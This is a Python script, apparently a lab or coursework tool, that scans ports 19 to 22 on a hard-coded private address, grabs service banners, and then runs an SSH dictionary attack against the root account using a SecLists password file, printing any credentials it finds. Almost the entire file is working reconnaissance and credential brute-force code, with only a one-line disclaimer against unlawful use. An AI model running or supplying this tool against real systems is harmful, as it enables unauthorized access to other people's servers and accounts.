from scapy.all import *
from scapy.layers.inet import TCP, IP, Ether
from scapy.layers.l2 import ARP
import netifaces
import nmap
import socket
import paramiko, sys, os

#Self IP finder

a = netifaces.interfaces()

addrs = netifaces.ifaddresses('eth0')
addrs[netifaces.AF_INET]
lista = addrs[2]
ipaddr = lista[0]["addr"]

print("Self IP Address:", ipaddr)

#Self Netmask finder

addrs = netifaces.ifaddresses('eth0')
addrs[netifaces.AF_INET]
lista = addrs[2]
netmask = lista[0]["netmask"]

print("Self Netmask:", netmask)

#Port Scanner

target = '192.168.1.56'

scanner = nmap.PortScanner()
openPorts = []
for i in range(19, 22 + 1):
    res = scanner.scan(target, str(i))

    res = res['scan'][target]['tcp'][i]['state']
    if res == 'open':
        openPorts.append(i)
        print(f'port {i} is {res}.')


#Banner Grabbing

mySocket = socket.socket()
for p in openPorts:
    mySocket = socket.socket()
    mySocket.connect((target, int(p)))
    mySocket.send("Get Banner \r\n".encode())
    serverRecv = mySocket.recv((2048)).decode()
    print(f"Port: {p} Banner: {serverRecv}")

#Brute-force

def sshConnect(password):
    # Create client and auto-add key to prevent printing of host key policy warning
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Attempt connection with user supplied creds (called iteratively)
    try:
        ssh.connect(target, port=int(float(port)), username=user, password=password)

    # Catch bad creds
    except paramiko.AuthenticationException:
        ssh.close()
        print('Unsuccessful')  # Print to attempt notification line

    # Catch target connection failure (generic exception) and clean up
    except OSError:
        f.close()
        ssh.close()
        sys.exit('\n[+] Connection to ' + target + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')

    # Handle user ctrl+c within function
    except KeyboardInterrupt:
        sys.exit('\n[+] Exiting...\n')

    # Must have found the password!
    else:
        print('Bingo!')
        print('\n[!] SUCCESS! Creds: ' + user + '@' + target + ':' + str(port) + ' Password: ' + password + '\n')
        f.close()
        ssh.close()
        sys.exit(0)


# Intro message and usage warning
print('\n[+] SSH Dictionary Attacker')
print('[!] No permission is given for the unlawful use of this script\n')

# Get target credentials and password file from user
try:
    port = 22
    user = "root"
    password_list = "/usr/share/wordlists/seclists/Passwords/passwd_sda.txt"

    # Check for empty strings, error exit if empty
    if target == '' or user == '' or password_list == '':
        sys.exit('\n[!] One or more required inputs ommited\n[+] Exiting...\n')

    # Check validity of password file path, error exit if not valid
    elif os.path.exists(password_list) == False:
        sys.exit('\n[!] File ' + password_list + ' does not exist\n[+] Exiting...\n')

    # Default port to 22 if empty string provided
    elif port == '':
        port = 22

# exit on ctrl+c gracefully in body of script
except KeyboardInterrupt:
    sys.exit('\n[+] Exiting...\n')

# Open and read password file
try:
    f = open(password_list, 'r')

# Catch generic file read errors
except OSError:
    sys.exit('\n[!] ' + password_list + ' is not an acceptable file path\n[+] Exiting...\n')

# Attempt count
count = 0

# Iterate through password file
for line in f.readlines():
    password = line.strip('\n')
    count += 1
    print('[-] Attempt ' + str(count) + ': ' + password + ' ...', end=' ')
    sshConnect(password)

# If unsuccessful, tidy up, print tip and unlucky message
f.close()
print('\n[+] Unsuccessful, Password list exhausted\n[!] Check username and/or use a larger password list\n')
sys.exit('[+] Exiting...\n')

